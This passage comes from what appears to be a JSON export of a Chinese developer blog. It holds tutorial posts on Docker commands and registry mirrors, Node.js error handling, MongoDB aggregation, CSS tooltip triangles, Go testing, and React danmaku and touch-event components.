指令用于设置环境变量，在 Dockerfile 中这些设置的环境变量也会影响到 RUN 指令，当运行生成的镜像时这些环境变量依然有效，如果需要在运行时更改这些环境变量可以在运行 docker run 时添加 –env &lt;key&gt;=&lt;value&gt;参数来修改。注意：最好不要定义那些可能和系统预定义的环境变量冲突的名字，否则可能会产生意想不到的结果。 EXPOSE 语法：EXPOSE &lt;port&gt; [ ...] 解释：EXPOSE 指令用来告诉 Docker 这个容器在运行时会监听哪些端口，Docker 在连接不同的容器（使用 –link 参数）时使用这些信息。 CMD 语法： CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] 将会调用 exec 执行，首选方式。 CMD [&quot;param1&quot;, &quot;param2&quot;] 当使用 ENTRYPOINT 指令时，为该指令传递默认参数。 CMD &lt;command&gt; [ &lt;param1&gt;|&lt;param2&gt; ] 将会调用 /bin/sh -c 执行。 解释：CMD 指令中指定的命令会在镜像运行时执行，在 Dockerfile 中只能存在一个，如果使用了多个 CMD 指令，则只有最后一个 CMD 指令有效。当出现 ENTRYPOINT 指令时，CMD 中定义的内容会作为ENTRYPOINT 指令的默认参数，也就是说可以使用 CMD 指令给 ENTRYPOINT 传递参数。 注意：RUN 和 CMD 都是执行命令，他们的差异在于 RUN 中定义的命令会在执行 docker build 命令创建镜像时执行，而 CMD 中定义的命令会在执行 docker run 命令运行镜像时执行，另外使用第一种语法也就是调用 exec 执行时，命令必须为绝对路径。 常用 docker 命令1234567891011121314151617181920212223242526272829docker images # 查看本地的 docker 镜像docker rmi &lt;image id&gt; # 删除本地的 docker 镜像docker build -t app:1.0 # 编译镜像，app 是镜像名称，1.0 是镜像版本docker ps # 查看运行的 docker，-a 表示全部docker stats # 查看 docker 示例# -d 是后台运行，-p 是把本地 3000 端口映射到 docker 容器里的 4000 端口， app:1.0 是指定运行的镜像# --name 是指定这个 docker 实例的名称docker run --name app -d -p 3000:4000 app:1.0docker logs &lt;container id&gt; # 查看容器输出日志docker stop &lt;container id&gt; # 停止容器运行docker start &lt;container id&gt; # 启动容器运行docker restart &lt;container id&gt; # 重启容器运行docker rm &lt;container id&gt; -f # 强制删除容器docker commit &lt;container id&gt; # 将 container 编译为 imagedocker attach &lt;container id&gt; # 连接正在运行的 container 的系统docker exec -it &lt;container id&gt; bash # 连接正在运行的 container 的系统（相当于 SSH 连接，ctrl + d 退出）docker search node # 搜索镜像docker pull node # 从 dockerhub 里下载镜像docker push lizhooh/node # 把自己的镜像推上去（需要注册 dockerhub，类似 npm 差不多）# 打包镜像docker save &lt;namespace&gt;/&lt;name:tag&gt; &gt; &lt;name&gt;.tar# docker save lizhooh/app:1.0 &gt; app.tar# 加载镜像docker load &lt; app.tar 参考：Docker 命令大全 切换国内源由于国内特殊的网络环境，往往我们从 Docker Hub 中拉取镜像并不能成功，而且速度特别慢。 那么我们可以给 Docker 配置一个国内的 registry mirror，当我们需要的镜像在 mirror 中则直接返回，如果没有则从 Docker Hub 中拉取。是否使用 registry mirror 对 Docker 用户来说是透明的。 配置方法： 1234567nano /etc/default/docker# 在尾部追加信息DOCKER_OPTS=\"--registry-mirror=http://aad0405c.m.daocloud.io\"# 重启服务service docker restart 参考资料 Docker 中文文档 Docker 概述 不使用 sudo 命令执行 docker Docker 部署基于 Nodejs 的 Web 应用-实战篇","categories":[{"name":"Docker","slug":"Docker","permalink":"http://me.lizhooh.com/categories/Docker/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Docker","slug":"Docker","permalink":"http://me.lizhooh.com/tags/Docker/"}]},{"title":"如何防止 Nodejs 进程崩溃？","slug":"Nodejs/如何防止 Nodejs 进程崩溃？","date":"2018-03-04T12:17:15.000Z","updated":"2021-06-15T06:10:52.845Z","comments":true,"path":"/stories/2018/03/Nodejs/如何防止 Nodejs 进程崩溃？/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/Nodejs/如何防止 Nodejs 进程崩溃？/","excerpt":"前言在 Nodejs 里的错误主要来自于事件错误，异步错误，同步错误，如果不适当处理，轻则控制台输出错误信息，重则直接导致整个进程退出。 涉及的几个问题： 如果没有在 Nodejs 中处理已经拒绝的 Promose 会发生什么？如何调试？ 如果不处理流中的错误事件，会发生什么情况？ 如果同步操作发生错误，Nodejs 进程会怎样？","text":"前言在 Nodejs 里的错误主要来自于事件错误，异步错误，同步错误，如果不适当处理，轻则控制台输出错误信息，重则直接导致整个进程退出。 涉及的几个问题： 如果没有在 Nodejs 中处理已经拒绝的 Promose 会发生什么？如何调试？ 如果不处理流中的错误事件，会发生什么情况？ 如果同步操作发生错误，Nodejs 进程会怎样？ 未捕捉的 Promose如果没有在 Nodejs 中处理已经拒绝的 Promose 会发生什么？如何调试？这个问题的答案是 Nodejs 还在运行。 在新版本的 Nodejs（v8.0x+）里，如果你不处理已经拒绝的 Promose，在控制台里将会看到一串一串的错误信息。 1234567new Promise((resolve, reject) =&gt; &#123; reject(new Error('错误'));&#125;);// (node:5380) UnhandledPromiseRejectionWarning: Unhandled promise rejection (rejection id: 1): Error: 错误// (node:5380) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future,// promise rejections that are not handled will terminate the Node.js process with a non-zero exit code. 在这里说明了有一个未处理的 reject，在现在的版本，这种错误并不会让进程退出，而在未来将发生改变，未处理的 reject 会使 Nodejs 进程以非零码退出！！！ 那么如何调试？很明显从输出的信息来看很难找到调试点，(node:5380) 这个是不确定生成的，基本没什么用。 唯一可以看出调试信息的是 rejection (rejection id: 1): Error: 错误。这里有两个信息，一个是 id，一个是 reject 参数信息。id 的顺序是根据 reject 出现的顺序而分配的，在代码里找 Promise 定义的顺序是不行的，所以基本只剩下看 reject 参数信息，找到目标位置。 对于这个问题，较好的解决方法是对 Promise 添加 catch。 1234567891011121314new Promise((resolve, reject) =&gt; &#123; reject(new Error('错误'));&#125;).catch(err =&gt; console.error(err));+ async function () &#123; try &#123; await new Promise((resolve, reject) =&gt; &#123; reject(new Error('错误')); &#125;); &#125; catch(err) &#123; console.log(err); &#125;&#125;(); 这样就可以输出错误栈堆信息，并且可以直接知道在代码的某处出现错误。 当然，如果真的不想为没一个 Promise 都添加 catch，那么可以使用 unhandledRejection 来捕捉所有的错误栈，只有没有 catch 才会触发这个事件。 如果在事件循环的一次轮询中，一个 Promise 被 rejected，并且此 Promise 没有绑定错误处理器， unhandledRejection 事件会被触发。当使用 Promise 进行编程时，异常会以 rejected promises 的形式封装。Rejection 可以被 promise.catch() 捕获并处理，并且在 Promise 链中传播。unhandledRejection 事件在探测和跟踪 promise 被 rejected，并且 rejection 未被处理的场景中是很有用的。 1234567new Promise((resolve, reject) =&gt; &#123; reject(new Error('错误'));&#125;);process.on('unhandledRejection', (reason, p) =&gt; &#123; console.log('Unhandled Rejection at:', p, 'reason:', reason);&#125;); 对于使用 new Error 的错误，在控制台上将有错误栈堆，其他将没有，因此非常推荐使用 new Error 标记错误。看看下面的代码输出有什么不同？ 1234567new Promise((resolve, reject) =&gt; &#123; reject(new Error('错误'));&#125;).catch(err =&gt; console.error(err));new Promise((resolve, reject) =&gt; &#123; reject('错误');&#125;).catch(err =&gt; console.error(err)); 未监听流的错误如果不处理流中的错误事件，会发生什么情况？这个问题的答案是 Nodejs 进程直接退出（非零码）。 12const fs = require('fs');const stream = fs.createReadStream('./aaa'); 很明显整个进程直接退出（这是一个多么恐怖的事情？），所有请为所有的不确定流接口都上错误事件吧。 12345const fs = require('fs');const stream = fs.createReadStream('./aaa');stream.on('error', err =&gt; &#123; console.log(err);&#125;); 这里有一个问题，流是不能使用 try/catch 来捕捉的，因为流是异步进行的。 123456try &#123; const stream = fs.createReadStream('./aaa');&#125;catch(err) &#123; console.log(err);&#125; 有一个事件，可以捕捉这种错误：uncaughtException。 在 uncaughtException 当一个未捕获的 JavaScript 异常堆满回到事件循环一路发出事件。默认情况下，Node.js 通过打印堆栈跟踪 stderr 和退出来处理这些异常。为该 uncaughtException 事件添加处理程序会覆盖此默认行为。 12345678const fs = require('fs');const stream = fs.createReadStream('./aaa');console.log('A'); // 输出了process.on('uncaughtException', (err) =&gt; &#123; console.error(err);&#125;); 这不知情下， uncaughtException 的作用非常大，特别是在持续性的服务里，使用它来监听任何一个错误的信息（输出到日志文件里）。 123process.on('uncaughtException', (err) =&gt; &#123; log('error')(err);&#125;); 同步错误如果同步操作发生错误，Nodejs 进程会怎样？这个问题的答案是 Nodejs 进程直接退出（非零码）。 1234567JSON.parse(\"aaaaa:11\");console.log('A'); // 没有输出process.on('uncaughtException', (err) =&gt; &#123; console.error(err); // 没反应&#125;); 并且这种错误，使用 uncaughtException 无法捕捉，唯一能捕捉的是 try/catch。 12345678try &#123; JSON.parse(\"aaaaa:11\");&#125;catch(err) &#123; console.log(err);&#125;console.log('A'); // 输出了 但是 try-catch 不适用于异步回调，未处理的 Promise 或流，但适用于 async，await。 记住永远也不让 Nodejs 崩溃这个是许多玩家的终极目标，那么请记住： 始终处理 Promise reject。并始终使用 new Error 来拒绝 Promise，以获取堆栈跟踪！ 始终处理 error 流的事件！这个非常重要会导致进程直接崩盘。 JSON.parse() 和 *Sync API 等同步函数，都可以在 try/catch 中捕捉错误，如果没有捕捉那将是致命的。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Mongodb 聚合（aggregate）","slug":"MongoDB/Mongodb 聚合（aggregate）","date":"2018-03-02T09:36:29.000Z","updated":"2021-06-15T06:10:52.828Z","comments":true,"path":"/stories/2018/03/MongoDB/Mongodb 聚合（aggregate）/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/MongoDB/Mongodb 聚合（aggregate）/","excerpt":"前言MongoDB 中聚合（aggregate）主要用于处理数据（诸如统计平均值，求和等），并返回计算后的数据结果。使用聚合框架 agregate 可以通过多个操作符对文档进行处理，将前一个操作符处理后的结果传给下一个操作符，最后一个操作符处理的结果就是聚合的最后的结果，中间处理就像管道一样。聚合的应用场景更多的是用于数据的整理与统计。","text":"前言MongoDB 中聚合（aggregate）主要用于处理数据（诸如统计平均值，求和等），并返回计算后的数据结果。使用聚合框架 agregate 可以通过多个操作符对文档进行处理，将前一个操作符处理后的结果传给下一个操作符，最后一个操作符处理的结果就是聚合的最后的结果，中间处理就像管道一样。聚合的应用场景更多的是用于数据的整理与统计。 基本知识先准备一些数据，先数据库里插入三个数据项。这里使用了 MongoDB 的官方 Nodejs 驱动。 1234567891011121314151617181920212223242526272829const mongodb = require('mongodb').MongoClient;+ async function () &#123; const server = await mongodb.connect('mongodb://192.168.3.11:27017'); const coll = server.db('test').collection('aggregate'); await coll.insertMany([&#123; title: 'MongoDB Overview', description: 'MongoDB is no sql database', by: 'w3cschool.cc', url: 'http://www.w3cschool.cc', tags: ['mongodb', 'database', 'NoSQL'], likes: 100 &#125;, &#123; title: 'NoSQL Overview', description: 'No sql database is very fast', by: 'w3cschool.cc', url: 'http://www.w3cschool.cc', tags: ['mongodb', 'database', 'NoSQL'], likes: 10 &#125;, &#123; title: 'Neo4j Overview', description: 'Neo4j is no sql database', by: 'Neo4j', url: 'http://www.neo4j.com', tags: ['neo4j', 'database', 'NoSQL'], likes: 750 &#125;]);&#125;(); 简单的使用： 说明： &quot;$url&quot; 是指定属性名称，与集合中的属性名称相比仅多了 $。 $project 从每个文档里映射出 url，默认 _id 也会映射。类似操作 find({}, { url: 1 })。 说明： $project 从每个文档里映射出 url，默认 _id 也会映射。类似操作 find({}, { url: 1 })。 $group 指定需要分组的字段为 url，每一个相同的 url 都和累加到 count 的数量里，count 是分组的新字段，名称任意。 说明： $project 从每个文档里映射出 url 和 likes，默认 _id 也会映射。类似操作 find({}, { url: 1, likes: 1 })。 $group 指定需要分组的字段为 url，每一个相同的 url 都和累加到 count 的数量里，count 是分组的新字段，名称任意。使用 $push 把 likes 插入到结果数组里。使用 $max 统计 likes 的最大值。 从上面可以看出，$project 更相思一个 select 操作，把属性选择出来，而 $match 更像是一个 find 操作，把数据过滤。 $project 除来选择属性，还可以重命名属性名称： 123await coll.aggregate([ $project: &#123; url: '$_id' &#125;]); 当 url 为 1 时，直接映射到 url，但 url 为 $_id 时，映射到 _id。 数学表达式算术表达式可用于操作 数值。（仅限于数值） $add 数值相加。 $subtract 数值相减。 $multiply 数值相乘。 $divide 数值相除。 $mod 数值取余。 1234567await coll.aggregate([ $project: &#123; total: &#123; $add: ['$likes', '$follow'] &#125; &#125;]); 字符串表达式也提供基本的字符串操作。 $substr 提取子串。 $concat 字符串连接。 $toLower 字符串小写。 $toUpper 字符串大写。 123456789101112await coll.aggregate([ $project: &#123; url: &#123; $concat: [ &#123; $substr: ['$title', 0, 3] &#125;, \"@@@\" ] &#125; &#125;]);// 等效于// url = url + title.substr(0, 3) + '@@@' 聚合表达式在这里，$sum，$max 都称为聚合表达式，而聚合表达式有： $sum 计算总和。 $avg 计算平均值。 $min 获取集合中所有文档对应值得最小值。 $max 获取集合中所有文档对应值得最大值。 $push 在结果文档中插入值到一个数组中。 $addToSet 在结果文档中插入值到一个数组中，但不创建副本。 $first 根据资源文档的排序获取第一个文档数据。 $last 根据资源文档的排序获取最后一个文档数据。 管道聚合提供管道的方式，与 Linux 中的管道概念差不多。 $project 修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。 $match 用于过滤数据，只输出符合条件的文档。- $match 使用 MongoDB 的标准查询操作。 $limit 用来限制 MongoDB 聚合管道返回的文档数。 $skip 在聚合管道中跳过指定数量的文档，并返回余下的文档。 $unwind 将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。 $group 将集合中的文档分组，可用于统计结果。 $sort 将输入文档排序后输出。 $geoNear 输出接近某一地理位置的有序文档。 aggregate 函数接收的是一个数组，数组的每个项都是一个管道值，它们的顺序按照数组的项顺序。 $match 的参数接收是查询对象，像这样： 123const res = coll.aggregate([ &#123; $match: &#123; likes: 100 &#125; &#125; // find(&#123; likes: 100 &#125;)]); $skip，$limit，$sort 与对应的函数，使用方法是一样的。 12345const res = coll.aggregate([ &#123; $skip: 100 &#125;, // 跳过 100 &#123; $sort: &#123; likes: 1 &#125; &#125;, // like 排序 &#123; $limit: 10 &#125;, // 只返回 5 个结果]); 聚合函数MongoDB 提供一些有用的聚合函数。 count() 返回文档数量。 distinct() 返回文档不重复项。 1await coll.distinct(&#123; url: 1 &#125;).count(); Map ReduceMongodb 提供一种 Map-Reduce（计算模型），简单的说就是将大批量的工作（数据）分解（Map）执行，然后再将结果合并成最终结果（Reduce），类似分布式计算的。 基本用法： 12345678910db.collection.mapReduce( function() &#123; emit(key,value) &#125;, // map 函数 function(key,values) &#123;return reduceFunction&#125;, // reduce 函数 &#123; out: collection, // 统计结果存放集合 query: document, // 筛选条件 sort: document, // 排序参数 limit: number, // 控制数量 &#125;) 其中需要自己实现 Map 函数和 Reduce 函数。Map 函数调用 emit(key, value)，遍历 collection 中所有的记录，将 key 与 value 传递给 Reduce 函数进行处理。 现在来模拟的插入一些数据： 123456await coll.insertMany([...new Array(20) .map(i =&gt; (&#123; user_name: ['mark', 'runoob'][Math.random() * 2 | 0], status: ['active', 'disabled', 'wait'][Math.random() * 3 | 0], &#125;))]); 然后使用 Map-Reduce 来统计： 12345678910const res = await coll.mapReduce( () =&gt; emit(this.user_name, 1), (key, values) =&gt; Array.sum(values), &#123; query: &#123; status: \"active\" &#125;, out: \"total\", &#125;,);console.log(res); 输出的结果： 1234567891011&#123; \"result\": \"total\", // 结果名称，与 out 相同 \"timeMillis\": 23, // 执行花费的时间（ms）。 \"counts\": &#123; \"input\": 5, // 满足条件被发送到 map 函数的文档个数。 \"emit\": 5, // emit 被调用的次数。 \"reduce\": 1, // reduce 被调用的次数。 \"output\": 2 // 结果集合中的文档个数。 &#125;, \"ok\": 1 // 是否成功&#125; 接着再调用 find() 查看结果集合。 123res.find();// &#123; \"_id\" : \"mark\", \"value\" : 4 &#125;// &#123; \"_id\" : \"runoob\", \"value\" : 1 &#125; 连接查询（$lookup）$lookup 是用于模仿关系式数据库的左连表查询的一个语法（3.2 新增加）。 12345678db.collection.aggregate([&#123; $lookup: &#123; from: &lt;collection to join&gt;, localField: &lt;field from the input documents&gt;, foreignField: &lt;field from the documents of the \"from\" collection&gt;, as: &lt;output array field&gt; &#125;&#125;]) 参数说明： from：需要去连接的 collection，也就是右表的表名。 localField：需要去进行连接的左表的字段名。 foreignField：右表的字段名，可以与左表的字段名不一样，但是数据类型必须一致。 as：形成的新的数组的名称。 示例：使用 $lookup 做多表关联处理 参考资料 http://www.mongodb.org.cn/tutorial/19.html","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"实现小三角效果","slug":"HTML5/实现小三角效果","date":"2018-03-01T05:06:17.000Z","updated":"2021-06-15T06:10:52.823Z","comments":true,"path":"/stories/2018/03/HTML5/实现小三角效果/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/HTML5/实现小三角效果/","excerpt":"前言小三角经常被用于一些 Tooltip 组件里作为位置指向性设置，如下图。","text":"前言小三角经常被用于一些 Tooltip 组件里作为位置指向性设置，如下图。 相对的实现小三角有几种方式： 古老的图片背景方式（PNG）。（兼容性最好，不实在） border 透明方式。 rotate 旋转方式。（需要 CSS3 的支持） SVG 绘制。 Icon 图标。 border 透明border 透明的方式是利用元素的 border 四个方向呈现三角形的方式来实现的。 123456.tri &#123; width: 0; height: 0; border: 20px solid transparent; border-bottom-color: #3af;&#125; 上面的显示的是一个向上的蓝色三角，三角形的大小由 border 的大小决定。 这种实现方式有致命的缺点，不能添加阴影效果、圆角、边框，三角形的形状永远都是 90 度角。 一旦添加了影响（box-shadow）就会变成这样： rotate 旋转使用 rotate 实现，实际上是把矩形，做一个旋转通过错位的方式把三角形部分漏出来。 相比上面几种，使用 transform: rotate() 的实现应该是效果最好的了。可以有阴影效果，可以有圆角，可以有边框。 1234567.tri &#123; width: 30px; height: 30px; border-radius: 0 30px 30px 30px; background-color: #3af; transform: rotate(45deg);&#125; 椭圆形的小三角。 12345678.tri &#123; width: 30px; height: 30px; background-color: #3af; transform: rotate(45deg); border: 1px solid rgba(1, 1, 1, 0.10); box-shadow: 0 0 15px rgba(1, 1, 1, 0.24);&#125; 矩形小三角。 还没看到小三角？还需要一些技巧来做出小三角效果。利用 absolute 错位遮挡实现。 12345678910111213141516171819202122232425262728293031323334353637&lt;style&gt; .panel &#123; position: relative; &#125; .panel::before &#123; border: 1px solid rgba(1, 1, 1, 0.10); box-shadow: 0 5px 8px rgba(1, 1, 1, 0.10); position: absolute; content: ' '; top: 0px; left: 25px; transform: rotate(45deg); background-color: #f45; width: 20px; height: 20px; border-radius: 3px; &#125; .panel &gt; .box &#123; color: #616161; position: absolute; top: 10px; left: 10px; width: 200px; height: 100px; padding: 10px; box-shadow: 0 5px 8px rgba(1, 1, 1, 0.10); border: 1px solid rgba(1, 1, 1, 0.10); border-radius: 5px; background-color: #3af; &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=\"panel\"&gt; &lt;div class=\"box\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt; 为了区别先是用两种不同的颜色区分。 但是却是发现中间确是有一条线。 没关系，拿一个白色的线覆盖它，稳了！ 12345678910.panel::after &#123; position: absolute; content: ' '; top: 10px; left: 22.5px; height: 1px; width: 27px; background-color: #fff; border-radius: 8px 8px 0 0;&#125; 这样，就能处理好了。 小结目前为止使用图片实现的兼容性是最好的，但是这就额外的需要一些静态资源。而使用 CSS3 实现的效果是最好的，并且可以很灵活的实现，支持很多效果。","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"}]},{"title":"Go 单元测试与基准测试","slug":"Go/Go 单元测试与基准测试","date":"2018-02-22T02:20:41.000Z","updated":"2021-06-15T06:10:52.817Z","comments":true,"path":"/stories/2018/02/Go/Go 单元测试与基准测试/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/Go/Go 单元测试与基准测试/","excerpt":"前言测试是编程工作中非常重要的一环，但很多人却忽视了这一点，又或者只是把测试看作是一种可有可无的补充方式。 Go 内置了单元测试和基准测试模块，有 testing 和 httptest 这么几个包。","text":"前言测试是编程工作中非常重要的一环，但很多人却忽视了这一点，又或者只是把测试看作是一种可有可无的补充方式。 Go 内置了单元测试和基准测试模块，有 testing 和 httptest 这么几个包。 单元测试单元测试需要使用 testing 包。对于测试文件的命名 Go 是有要求的，统一是 xxx_text.go，并且每个测试函数需要规定格式 func TestXxx(*testing.T)。 下面编写一个简单的测试示例： 12345678910111213141516171819202122package mainimport ( \"strconv\" \"testing\")func Sum(arr []int) int &#123; var sum int = 0 for i := 0; i &lt; len(arr); i++ &#123; sum += arr[i] &#125; return sum&#125;func TestSum(t *testing.T) &#123; var arr []int = []int&#123;1, 2, 3, 4, 5&#125; sum := Sum(arr) if sum != 15 &#123; t.Error(\"sum 不等于 15, sum = \" + strconv.Itoa(sum)) &#125;&#125; 这样直接使用 test 命令运行： 1go test index_test.go 还可以使用参数 -v 来获取更详细信息，-cover 获取测试用例对代码的覆盖率。使用 -parallel 来指定并行测试数量。 Testing.T 结构有几个常用的函数： Log：将给定的文本记录到错误日志里面，与 fmt.Println 类似。 Logf：与 Log 不同的是格式与 fmt.Printf 类似。 Error：测试错误标记。 Skip：用于跳过某个测试函数。 Fail：直接将测试函数标为已失败，但允许测试函数继续执行。 FailNow：直接将测试函数标为已失败，并停止执行测试函数。 基准测试基准测试需要使用 testing 包。对于测试文件的命名 Go 是有要求的，统一是 xxx_text.go，并且每个测试函数需要规定格式 func BenchmarkXxx(b *testing.B)。 1234567func BenchmarkSum(b *testing.B) &#123; var arr []int = []int&#123;1, 2, 3, 4, 5&#125; for i := 0; i &lt; b.N; i++ &#123; Sum(arr) &#125;&#125; 也是使用 test 命令，需要添加 -bench： 123go test index_test.go -v -bench .BenchmarkSum 300000000 5.72 ns/op 这里 300000000 是指迭代次数，这是 Go 自己决定的，而 5.72ns/op 指的是每次执行 Sum 都需要 5.72 纳秒。","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"React 弹幕功能前端的实现","slug":"React/React/React 弹幕功能前端的实现","date":"2018-02-20T09:10:59.000Z","updated":"2021-06-15T06:10:52.878Z","comments":true,"path":"/stories/2018/02/React/React/React 弹幕功能前端的实现/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/React/React/React 弹幕功能前端的实现/","excerpt":"前言弹幕是比较热的新交互方式，可以给观众一种“实时互动”的错觉，虽然不同弹幕的发送时间有所区别，但是其只会在视频中特定的一个时间点出现，因此在相同时刻发送的弹幕基本上也具有相同的主题，在参与评论时就会有与其他观众同时评论的错觉，变相提升用户的体验。 对于弹幕功能的前端实现，有两种比较好的方法，其中使用 dom 实现最简单，使用 canvas 实现，性能最好。 基于 DOM 的实现方案。 基于 Canvas 的实现方案。","text":"前言弹幕是比较热的新交互方式，可以给观众一种“实时互动”的错觉，虽然不同弹幕的发送时间有所区别，但是其只会在视频中特定的一个时间点出现，因此在相同时刻发送的弹幕基本上也具有相同的主题，在参与评论时就会有与其他观众同时评论的错觉，变相提升用户的体验。 对于弹幕功能的前端实现，有两种比较好的方法，其中使用 dom 实现最简单，使用 canvas 实现，性能最好。 基于 DOM 的实现方案。 基于 Canvas 的实现方案。 本介绍使用 React 基于 DOM 的实现方案。 知识准备： react styled-components css3 动画组件动画组件负责把包裹的节点，从屏幕的一方移动到另一方，这个过程需要一个动画效果。 弹幕动画除了左移动，还可以右移动，斜着也行哦。 假设动画元素为 A，弹幕的区域为 [W, H]，那么 A 应该有以下条件： A 在 Y 轴上的坐标应该是随机数且 Ay ∈ [0, H - Ah]。 起始点为屏幕的最左边（或右边），即 （0，Ay）。 动画的路径长度为：S = | W + Aw |。 动画结束点为：（W，Ay）。 动画的持续时间可以是统一或者随机。 动画缓冲函数可以是统一或者随机。 整个动画元素可以这样去做，首先要求是只渲染一次，接着动态修改组件的样式，以达到上面的要求。 利用 CSS3 的 transition, transform 来制作动画而不是 animation 哦。 为什么不用 animation？实际上也可以用 animation，但是使用 animation 需要写很多 @keyframes，因为每个 @keyframes 都有随机因子。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import React, &#123; Component &#125; from 'react';import styled from 'styled-components';export default class Anit extends Component &#123; state = &#123; x: this.props.start, ok: false, &#125; shouldComponentUpdate(nextProps, nextState) &#123; return !this.state.ok; // 初始化后就不更新了 &#125; componentDidMount() &#123; setTimeout(() =&gt; &#123; this.setState(&#123; x: this.props.end, ok: true &#125;); &#125;, 0); &#125; render() &#123; const &#123; x &#125; = this.state; const &#123; timeout, vert, ease = 'linear' &#125; = this.props; return ( &lt;Panel timeout=&#123;timeout&#125; // 持续时间 x=&#123;x&#125; // X 轴位置 y=&#123;vert&#125; // Y 轴的位置 ease=&#123;ease&#125; // 随机缓动系数 &gt; &#123;this.props.children&#125; &lt;/Panel&gt; ); &#125;&#125;const Panel = styled.div` position: absolute; top: $&#123;p =&gt; p.y || 0&#125;px; left: 0; font-weight: bold; color: #fff; text-shadow: 1px 2px 2px rgba(1, 1, 1, 0.32); transition: transform $&#123;p =&gt; p.timeout&#125;ms $&#123;p =&gt; p.ease&#125;; /* 调整持续时间，缓冲函数 */ transform: translate3d($&#123;p =&gt; p.x || -100&#125;px, 0, 0); /* 动画 */ display: flex; justify-content: center; align-items: center;`; 容器层容器层是一个透明层，非常简单。在容器层里面维护着一个任务队列用来管理动画组件。 12345678910111213list.map((bar, index) =&gt; ( &lt;Anit key=&#123;`barrage-$&#123;bar.id&#125;`&#125; start=&#123;-30 * (bar.text + '').length&#125; end=&#123;width + 30&#125; vert=&#123;bar.vert&#125; timeout=&#123;8000&#125; ease=&#123;bar.ease&#125; &gt; &lt;img src=&#123;bar.avatar&#125; className=\"avatar\" /&gt; &lt;span&gt;&#123;bar.text&#125;&lt;/span&gt; &lt;/Anit&gt;))&#125; 每次有新的弹幕时，把数据塞进队列里。React 提供 key 计算 diff 得出新的 DOM 节点。为了避免动画组件重新渲染，只需要把它设为只渲染一次的状态即可。 性能优化有几个可以优化的地方： 动画结束后从父节点删除，防止节点累积。 用队列结构，对屏幕上的动画元素数量进行控制，防止大量动画元素造成性能不佳以及遮挡视觉。 动画元素尽可能最少节点化。 其他本文示例 Demo 代码：react-barrage-demo","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Touch 事件实践","slug":"React/React/React Touch 事件实践","date":"2018-02-18T13:27:58.000Z","updated":"2021-06-15T06:10:52.876Z","comments":true,"path":"/stories/2018/02/React/React/React Touch 事件实践/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/React/React/React Touch 事件实践/","excerpt":"前言React Touch 事件实践，附带几个利用 Touch 系列制作的示例。 知识准备： react styled-components css3 Touch 系列React 提供了 Touch 相关的事件（对应由 HTML5 API 提供），非常适用于在移动端上监听触摸事件。","text":"前言React Touch 事件实践，附带几个利用 Touch 系列制作的示例。 知识准备： react styled-components css3 Touch 系列React 提供了 Touch 相关的事件（对应由 HTML5 API 提供），非常适用于在移动端上监听触摸事件。 Touch 就是触摸事件系列比较常用的有： onTouchStart：触摸开始。 onTouchMove：触摸移动。 onTouchEnd：触摸结束。 onTouchCancel：触摸取消。 onTouchStartCapture：触摸移动。 onTouchEndCapture：触摸开始。 onTouchMoveCapture：触摸结束。 onTouchCancelCapture：触摸取消。 它们的回调函数都提供一个 e.touches、e.changedTouches、e.targetTouches 数组，这个数组里的对象就是触摸点的数据。 touches一个 TouchList 对象，包含当前所有接触屏幕的触点的 Touch 对象，不论 TouchStart 事件从哪个 elment 上触发。 targetTouches也是一个 TouchList 对象，包含了如下触点的 Touch 对象：TouchStart 从当前事件的目标 element 上触发。 changedTouches也是一个 TouchList 对象，对于 TouchStart 事件, 这个 TouchList 对象列出在此次事件中新增加的触点。对于 TouchMove 事件，列出和上一次事件相比较，发生了变化的触点。对于 TouchEnd ，列出离开触摸平面的触点（这些触点对应已经不接触触摸平面的手指）。 TouchEnd 这里要特别注意，touches 和 targetTouches 只存储接触屏幕的触点，要获取触点最后离开的状态要使用 changedTouches。 其中需要关注的有： 